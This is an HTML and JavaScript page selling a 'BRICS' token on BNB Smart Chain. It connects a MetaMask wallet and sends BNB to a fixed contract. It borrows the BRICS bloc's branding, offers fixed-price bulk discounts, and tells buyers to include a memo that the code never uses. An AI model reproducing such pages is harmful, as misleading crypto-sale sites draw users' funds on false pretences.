<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
Â  <meta charset="utf-8" />
Â  <meta name="viewport" content="width=device-width,initial-scale=1" />
Â  <title>Buy BRICS Token</title>
Â  Â  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
Â  <meta name="theme-color" content="#0b63ff"/>
Â  <style>
Â  Â  :root{
Â  Â  Â  --bg:#f3f6fb; --card:#ffffff; --primary:#0b63ff; --accent:#00b07a; --muted:#6b7280;
Â  Â  Â  --glass: rgba(255,255,255,0.7);
Â  Â  }
Â  Â  *{box-sizing:border-box}
Â  Â  body{
Â  Â  Â  margin:0; font-family: "Vazirmatn", "Arial", sans-serif; background:linear-gradient(180deg,#f6f9ff 0%,var(--bg) 100%);
Â  Â  Â  -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; padding:18px;
Â  Â  Â  display:flex; align-items:flex-start; justify-content:center; min-height:100vh;
Â  Â  Â  direction:ltr; /* Changed to LTR */
Â  Â  }
Â  Â  .container{width:100%;max-width:920px;margin:auto}
Â  Â  .card{
Â  Â  Â  background:var(--card); border-radius:18px; padding:18px; box-shadow:0 12px 40px rgba(11,99,255,0.06);
Â  Â  Â  overflow:hidden; display:flex; gap:18px; align-items:flex-start; flex-direction:column;
Â  Â  }

Â  Â  /* top map + logo */
Â  Â  .hero{
Â  Â  Â  position:relative; border-radius:12px; overflow:hidden; height:160px; display:block;
Â  Â  Â  background:linear-gradient(90deg, rgba(11,99,255,0.06), rgba(0,176,122,0.03));
Â  Â  }
Â  Â  .hero img.map{ width:50%; height:50%; object-fit:cover; filter:contrast(1.02) saturate(1.02); }
Â  Â  .logo{
Â  Â  Â  position:absolute; left:50%; transform:translateX(-50%); top:16px; width:86px; height:86px; border-radius:50%;
Â  Â  Â  background:linear-gradient(180deg,#fff,#f4f8ff); display:flex; align-items:center; justify-content:center;
Â  Â  Â  border:3px solid rgba(11,99,255,0.12);
Â  Â  Â  box-shadow:0 8px 20px rgba(11,99,255,0.08);
Â  Â  }
Â  Â  .logo img{ width:38%; height:38%; object-fit:contain; }

Â  Â  h1{color:var(--primary); font-size:22px; margin:10px 0 2px; text-align:center}
Â  Â  .sub{ text-align:center; color:var(--muted); font-weight:600; margin-bottom:6px; }

Â  Â  .contract-row{display:flex; gap:10px; align-items:center; justify-content:center; flex-wrap:wrap; margin-top:8px}
Â  Â  .contract-box{background:linear-gradient(180deg,#f7fbff,#ffffff); padding:8px 12px; border-radius:10px; border:1px solid #eef5ff; font-weight:800; direction:ltr}
Â  Â  .copy-btn{background:transparent;border:none;color:var(--primary);cursor:pointer;font-weight:800}

Â  Â  .grid{
Â  Â  Â  width:100%; display:grid; grid-template-columns: 1fr 340px; gap:16px; margin-top:12px;
Â  Â  }
Â  Â  @media(max-width:880px){ .grid{ grid-template-columns:1fr; } }

Â  Â  /* left column (controls) */
Â  Â  .panel{ padding:12px; border-radius:12px; background:linear-gradient(180deg,#ffffff,#fcfeff); border:1px solid rgba(11,99,255,0.04) }
Â  Â  .label{ font-weight:800; color:#0e2546; margin-bottom:6px }
Â  Â  .input-row{ display:flex; gap:10px; align-items:center; }
Â  Â  .amount-input{ flex:1; padding:12px 10px; font-size:16px; border-radius:10px; border:1px solid #e6eefb; outline:none; direction:ltr; }
Â  Â  .amount-input:focus{ box-shadow:0 6px 20px rgba(11,99,255,0.06); border-color:var(--primary) }
Â  Â  .token-tag{ min-width:96px; background:linear-gradient(90deg,#f3f7ff,#ffffff); border-radius:10px; padding:10px; text-align:center; font-weight:900; letter-spacing:1px }

Â  Â  .calc-row{ display:flex; justify-content:space-between; gap:8px; margin-top:8px; color:var(--muted); font-weight:700 }
Â  Â  .memo{ margin-top:12px; padding:10px; border-radius:10px; background:linear-gradient(180deg,#f6fbff,#ffffff); border:1px solid #eef6ff; font-weight:700; text-align:left; }

Â  Â  /* right column (wallet & buy) */
Â  Â  .wallet-card{ padding:14px; border-radius:12px; background:linear-gradient(90deg,#f8fbff,#ffffff); border:1px solid rgba(11,99,255,0.04); display:flex; flex-direction:column; gap:10px; align-items:stretch }
Â  Â  .wallet-top{ display:flex; justify-content:space-between; align-items:center; gap:8px; }
Â  Â  .wallet-addr{ font-weight:800; direction:ltr; color:#0b63ff }
Â  Â  .connect-btn{ padding:12px;border-radius:12px;border:none;background:linear-gradient(90deg,#0b63ff,#2e8bff);color:#fff;font-weight:900; cursor:pointer; box-shadow:0 8px 20px rgba(11,99,255,0.12) }
Â  Â  .connect-btn:disabled{ opacity:0.6; cursor:not-allowed }

Â  Â  .balances{ display:flex; gap:8px; flex-direction:column; margin-top:6px }
Â  Â  .bal-row{ display:flex; justify-content:space-between; background:linear-gradient(180deg,#fff,#fbfeff); padding:8px 10px; border-radius:8px; border:1px solid #eef6ff; font-weight:800 }
Â  Â  .bal-row > div:last-child { direction:ltr; }

Â  Â  .buy-btn{ margin-top:6px; padding:12px; border-radius:12px; border:none; cursor:pointer; font-weight:900; color:#fff; background:linear-gradient(90deg,#00b07a,#0076f3); box-shadow:0 10px 30px rgba(0,112,240,0.12) }
Â  Â  .buy-btn:disabled{ opacity:0.5; cursor:not-allowed }

Â  Â  .status{ margin-top:10px; min-height:20px; font-weight:800; color:var(--muted); text-align:left; }

Â  Â  .small{ font-size:13px; color:var(--muted) }

Â  Â  .footer-note{ margin-top:14px; font-size:13px; color:#4b5563; text-align:center; }

Â  Â  .spinner{ display:inline-block; width:16px; height:16px; border-radius:50%; border:3px solid rgba(0,0,0,0.08); border-top-color:var(--primary); animation:spin 1s linear infinite; vertical-align:middle; margin-left:8px; visibility:hidden; }
Â  Â  .spinner.visible{ visibility:visible; }
Â  Â  @keyframes spin{ to{ transform:rotate(360deg) } }

Â  </style>
</head>
<body>
Â  <div class="container">
Â  Â  <div class="card" role="main" aria-labelledby="title">
Â  Â  Â  <div class="hero">
Â  Â  Â  Â  <img class="map" src="brics-map.jpg" alt="BRICS map image (colored members)" />
Â  Â  Â  Â  <div class="logo"><img src="bricslogo.png" alt="BRICS logo" /></div>
Â  Â  Â  </div>

Â  Â  Â  <h1 id="title">Buy BRICS Token</h1>
Â  Â  Â  <div class="sub">Please add the contract address to MetaMask to view the token before buying.</div>

Â  Â  Â  <div class="contract-row">
Â  Â  Â  Â  <div id="contractBox" class="contract-box" title="Click to copy">0xAF20...3037</div>
Â  Â  Â  Â  <button id="copyContract" class="copy-btn">Copy</button>
Â  Â  Â  </div>

Â  Â  Â  <div class="grid">
Â  Â  Â  Â  Â  Â  Â  Â  <div class="panel">
Â  Â  Â  Â  Â  <div class="label">Current Price</div>
Â  Â  Â  Â  Â  <div id="priceLine" class="small"><span id="priceText">Fetching price...</span> <span id="priceSpinner" class="spinner"></span></div>

Â  Â  Â  Â  Â  <div class="label" style="margin-top:12px">Enter amount of BRICS to buy</div>
Â  Â  Â  Â  Â  <div class="input-row" style="margin-top:8px">
Â  Â  Â  Â  Â  Â  <input id="bricsAmount" class="amount-input" type="number" min="1" placeholder="e.g. 1000" />
Â  Â  Â  Â  Â  Â  <div class="token-tag">BRICS</div>
Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  <div class="calc-row" style="margin-top:10px">
Â  Â  Â  Â  Â  Â  <div id="usdPreview">USD: $0.00</div>
Â  Â  Â  Â  Â  Â  <div id="discountPreview">Discount: 0%</div>
Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  <div class="memo" style="margin-top:12px">
Â  Â  Â  Â  Â  Â  <div><strong>MEMO TAG:</strong> <span id="memoTag">â€”</span></div>
Â  Â  Â  Â  Â  Â  <div class="small" style="margin-top:6px">Include this MEMO when sending BNB to ensure the transaction is processed correctly.</div>
Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  <div class="label" style="margin-top:12px">More Information</div>
Â  Â  Â  Â  Â  <div class="small" style="margin-top:6px; line-height:1.45">
Â  Â  Â  Â  Â  Â  Payment Network: <strong>BNB Smart Chain (BEP20)</strong> â€” Contract Address: <code style="direction:ltr">0xAF2009350F6ECBE22c23A505a590239c7aaA3037</code>.
Â  Â  Â  Â  Â  Â  BRICS price is fixed at **$3.11**. The BNB equivalent is calculated based on the live BNB/USD market rate.
Â  Â  Â  Â  Â  </div>
Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  Â  Â  Â  <div class="wallet-card">
Â  Â  Â  Â  Â  <div class="wallet-top">
Â  Â  Â  Â  Â  Â  <div>
Â  Â  Â  Â  Â  Â  Â  <div class="small">My Wallet</div>
Â  Â  Â  Â  Â  Â  Â  <div class="wallet-addr" id="walletAddr">â€”</div>
Â  Â  Â  Â  Â  Â  </div>
Â  Â  Â  Â  Â  Â  <div style="text-align:left">
Â  Â  Â  Â  Â  Â  Â  <div class="small">Owner (receive BNB)</div>
Â  Â  Â  Â  Â  Â  Â  <div style="direction:ltr; font-weight:800; color:#0b63ff">0x67594E1D30Ce...486cf</div>
Â  Â  Â  Â  Â  Â  </div>
Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  <div id="balances" style="display:none" class="balances">
Â  Â  Â  Â  Â  Â  <div class="bal-row"><div>BNB</div><div id="bnbBal">0 BNB</div></div>
Â  Â  Â  Â  Â  Â  <div class="bal-row"><div>BRICS</div><div id="bricsBal">0 BRICS</div></div>
Â  Â  Â  Â  Â  </div>

Â  Â  Â  Â  Â  <button id="connectBtn" class="connect-btn">Connect Wallet</button>

Â  Â  Â  Â  Â  <button id="buyBtn" class="buy-btn" disabled>Buy BRICS</button>

Â  Â  Â  Â  Â  <div id="status" class="status">Status: Ready</div>
Â  Â  Â  Â  Â  <div class="footer-note">Accepted: <strong>BNB (BEP20)</strong> â€¢ Pair: PancakeSwap</div>
Â  Â  Â  Â  </div>
Â  Â  Â  </div>

Â  Â  </div>
Â  </div>

<script>
/* ================== CONFIG ================== */
const BRICS_CONTRACT = "0xAF2009350F6ECBE22c23A505a590239c7aaA3037".toLowerCase();
const OWNER_ADDRESS = "0x67594E1D30Cec8a5f906C8278A1BC694641486cf".toLowerCase();
const CHAIN_ID_BSC = 56;
const BRICS_USD_PRICE = 3.11; // ðŸ’¡ FIXED PRICE: 3.11 USD
/* ABIs */
const ERC20_ABI = ["function balanceOf(address) view returns (uint256)","function decimals() view returns (uint8)"];
const BRICS_ABI = ["function buyWithBNB() payable"];
/* ============================================ */

const contractBox = document.getElementById('contractBox');
const copyContract = document.getElementById('copyContract');
const priceText = document.getElementById('priceText');
const priceSpinner = document.getElementById('priceSpinner');
const bricsAmount = document.getElementById('bricsAmount');
const usdPreview = document.getElementById('usdPreview');
const discountPreview = document.getElementById('discountPreview');
const memoTag = document.getElementById('memoTag');
const connectBtn = document.getElementById('connectBtn');
const buyBtn = document.getElementById('buyBtn');
const walletAddr = document.getElementById('walletAddr');
const bnbBal = document.getElementById('bnbBal');
const bricsBal = document.getElementById('bricsBal');
const balancesDiv = document.getElementById('balances');
const statusEl = document.getElementById('status');

contractBox.textContent = short(BRICS_CONTRACT);

/* small helpers */
function short(a){ if(!a) return 'â€”'; return a.slice(0,6)+'...'+a.slice(-4); }
function isMobile(){ return /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent); }
function setStatus(msg, type=''){ statusEl.textContent = msg; statusEl.className = 'status'; if(type) statusEl.classList.add(type); }

/* copy contract */
copyContract.addEventListener('click', async ()=>{
Â  try{ await navigator.clipboard.writeText(BRICS_CONTRACT); setStatus('Contract address copied successfully âœ…'); }
Â  catch(e){ setStatus('Copy failed â€” please copy manually', 'error'); console.error(e); }
});
contractBox.addEventListener('click', ()=> copyContract.click());

/* memo tag */
let currentMemo = genMemo();
memoTag.textContent = currentMemo;
function genMemo(){ return Math.random().toString(36).slice(2,10).toUpperCase(); }

/* Price fetch (Fixed BRICS Price, Dynamic BNB Price) */
let providerRpc = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
let bnbUsdPrice = 0; // Dynamic BNB price
let bricsPriceBNB = 0; // Calculated BRICS price in BNB based on $3.11
let bricsDecimals = 18; // Default, will try to fetch

async function fetchBnbUsd(){
Â  try{
Â  Â  const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
Â  Â  const j = await res.json();
Â  Â  bnbUsdPrice = parseFloat(j.price);
Â  Â  
Â  Â  // ðŸ’¡ CALCULATE FIXED BRICS PRICE IN BNB
Â  Â  if (bnbUsdPrice > 0) {
Â  Â  Â  bricsPriceBNB = BRICS_USD_PRICE / bnbUsdPrice;
Â  Â  Â  priceText.textContent = `1 BRICS = $${BRICS_USD_PRICE.toFixed(2)} (â‰ˆ ${bricsPriceBNB.toFixed(6)} BNB)`;
Â  Â  } else {
Â  Â  Â  priceText.textContent = `1 BRICS = $${BRICS_USD_PRICE.toFixed(2)} (BNB Price Unavailable)`;
Â  Â  }
Â  Â  
Â  Â  return bnbUsdPrice;
Â  }catch(e){ 
Â  Â  console.error("fetchBnbUsd failed", e); 
Â  Â  bnbUsdPrice = 0; 
Â  Â  priceText.textContent = `1 BRICS = $${BRICS_USD_PRICE.toFixed(2)} (Error fetching BNB price)`;
Â  Â  throw e; 
Â  }
}

async function updatePrices(){
Â  priceSpinner.classList.add('visible');
Â  await fetchBnbUsd();
Â  priceSpinner.classList.remove('visible');
Â  updateCalc();
Â  
Â  // Attempt to fetch decimals only once
Â  if (providerRpc && bricsDecimals === 18) {
Â  Â  try {
Â  Â  Â  const token = new ethers.Contract(BRICS_CONTRACT, ERC20_ABI, providerRpc);
Â  Â  Â  bricsDecimals = await token.decimals();
Â  Â  } catch (e) {
Â  Â  Â  console.warn("Failed to fetch token decimals, assuming 18.");
Â  Â  }
Â  }
}
updatePrices();
setInterval(updatePrices, 15000); // Update every 15 seconds

/* discount: linear mapping 100 -> 5% , 1,000,000 -> 50% */
function calcDiscount(a){
Â  const n = Number(a);
Â  if(!n || n < 100) return 0;
Â  if(n >= 1000000) return 50;
Â  const r = (n - 100) / (1000000 - 100);
Â  return Math.round((5 + r * 45) * 100) / 100; // 5% minimum
}

/* update calculation preview */
function updateCalc(){
Â  const amt = Number(bricsAmount.value);
Â  const disc = calcDiscount(amt);
Â  discountPreview.textContent = `Discount: ${disc.toFixed(1)}%`;
Â  
Â  if(!amt || !bricsPriceBNB || !bnbUsdPrice){ 
Â  Â  usdPreview.textContent = 'USD: $0.00'; 
Â  } else {
Â  Â  // Calculate total USD based on fixed price and discount
Â  Â  const totalUSD = amt * BRICS_USD_PRICE * (1 - disc/100); 
Â  Â  
Â  Â  usdPreview.textContent = `USD: $${totalUSD.toFixed(2)}`;
Â  Â  
Â  Â  // Total BNB needed
Â  Â  const totalBNB = totalUSD / bnbUsdPrice;
Â  Â  
Â  Â  // Update the BNB balance preview with the amount needed
Â  Â  bnbBal.textContent = `${totalBNB.toFixed(6)} BNB ($${totalUSD.toFixed(2)})`;
Â  }
Â  updateBuyState();
}
bricsAmount.addEventListener('input', updateCalc);

/* Wallet connect and balances */
let provider = null, signer = null, user = null;

async function connectWallet(){
Â  if(window.ethereum){
Â  Â  // DESKTOP (Web3/Injected Provider)
Â  Â  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
Â  Â  setStatus('Connecting to wallet...');
Â  Â  try{
Â  Â  Â  const network = await provider.getNetwork();
Â  Â  Â  if(network.chainId !== CHAIN_ID_BSC){
Â  Â  Â  Â  try{
Â  Â  Â  Â  Â  await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ethers.utils.hexValue(CHAIN_ID_BSC) }] });
Â  Â  Â  Â  }catch(switchErr){
Â  Â  Â  Â  Â  console.warn("switch chain failed", switchErr);
Â  Â  Â  Â  Â  setStatus('Please manually switch network to BNB Smart Chain (BSC)','error');
Â  Â  Â  Â  }
Â  Â  Â  }
Â  Â  Â  await provider.send("eth_requestAccounts", []);
Â  Â  Â  signer = provider.getSigner();
Â  Â  Â  user = await signer.getAddress();
Â  Â  Â  walletAddr.textContent = short(user);
Â  Â  Â  connectBtn.textContent = `Connected: ${short(user)}`;
Â  Â  Â  connectBtn.disabled = true;
Â  Â  Â  setStatus('Wallet connected successfully âœ…');
Â  Â  Â  await refreshBalances();
Â  Â  Â  updateBuyState();
Â  Â  }catch(e){
Â  Â  Â  console.error(e);
Â  Â  Â  setStatus('Connection failed: '+(e.message||e), 'error');
Â  Â  }
Â  } else {
Â  Â  // MOBILE/NO PROVIDER
Â  Â  if(isMobile()){
Â  Â  Â  // DEEP LINK to MetaMask mobile
Â  Â  Â  const href = window.location.href.replace(/^https?:\/\//,'');
Â  Â  Â  const link = `https://metamask.app.link/dapp/${href}`;
Â  Â  Â  setStatus('MetaMask not found â€” Attempting to open MetaMask mobile...');
Â  Â  Â  window.location.href = link;
Â  Â  } else {
Â  Â  Â  // DESKTOP NO PROVIDER
Â  Â  Â  setStatus('MetaMask extension not found â€” Please install it to connect.', 'error');
Â  Â  Â  window.open('https://metamask.io/download.html', '_blank');
Â  Â  }
Â  }
}

async function refreshBalances(){
Â  if(!provider || !user || bnbUsdPrice === 0) return;
Â  try{
Â  Â  const rawBnb = await provider.getBalance(user);
Â  Â  const bnb = parseFloat(ethers.utils.formatEther(rawBnb));
Â  Â  bnbBal.textContent = `${bnb.toFixed(6)} BNB (~$${(bnb*bnbUsdPrice).toFixed(2)})`;

Â  Â  const token = new ethers.Contract(BRICS_CONTRACT, ERC20_ABI, provider);
Â  Â  const rawTok = await token.balanceOf(user);
Â  Â  const tok = parseFloat(ethers.utils.formatUnits(rawTok, bricsDecimals));
Â  Â  // Value calculation uses fixed price
Â  Â  const tokUsdValue = tok * BRICS_USD_PRICE;
Â  Â  bricsBal.textContent = `${tok.toFixed(4)} BRICS (~$${tokUsdValue.toFixed(2)})`;

Â  Â  balancesDiv.style.display = 'flex';
Â  }catch(e){
Â  Â  console.error('refreshBalances error', e);
Â  Â  setStatus('Failed to fetch balances.', 'error');
Â  }
}

/* buy flow */
function updateBuyState(){
Â  const amt = Number(bricsAmount.value);
Â  buyBtn.disabled = !(signer && amt > 0 && bricsPriceBNB && bnbUsdPrice);
}

async function buyAction(){
Â  if(!signer){ setStatus('Please connect your wallet first', 'error'); return; }
Â  const amt = Number(bricsAmount.value);
Â  if(!amt || amt <= 0){ setStatus('Enter a valid BRICS amount', 'error'); return; }
Â  
Â  const discount = calcDiscount(amt);
Â  const totalBNB = amt * bricsPriceBNB * (1 - discount/100);
Â  setStatus('Preparing transaction to send to contract...');
Â  
Â  try{
Â  Â  const contract = new ethers.Contract(BRICS_CONTRACT, BRICS_ABI, signer);
Â  Â  // convert totalBNB to wei
Â  Â  const valueWei = ethers.utils.parseUnits(totalBNB.toFixed(18), 'ether');
Â  Â  
Â  Â  // Call the buy function
Â  Â  const tx = await contract.buyWithBNB({ value: valueWei });
Â  Â  setStatus('Transaction sent: ' + short(tx.hash));
Â  Â  await tx.wait();
Â  Â  setStatus('âœ… Transaction successful â€” BRICS sent to your wallet. Tx: ' + short(tx.hash));
Â  Â  
Â  Â  // generate new memo and refresh balances
Â  Â  currentMemo = genMemo(); 
Â  Â  memoTag.textContent = currentMemo;
Â  Â  await refreshBalances();
Â  }catch(e){
Â  Â  console.error('buy err', e);
Â  Â  setStatus('Error sending transaction: ' + (e.message || e), 'error');
Â  }
}

/* events */
connectBtn.addEventListener('click', connectWallet);
buyBtn.addEventListener('click', buyAction);
bricsAmount.addEventListener('input', updateCalc);

/* initial UI */
document.addEventListener('DOMContentLoaded', ()=>{
Â  setStatus('Ready â€” Please connect your wallet');
});
</script>
</body>
</html>
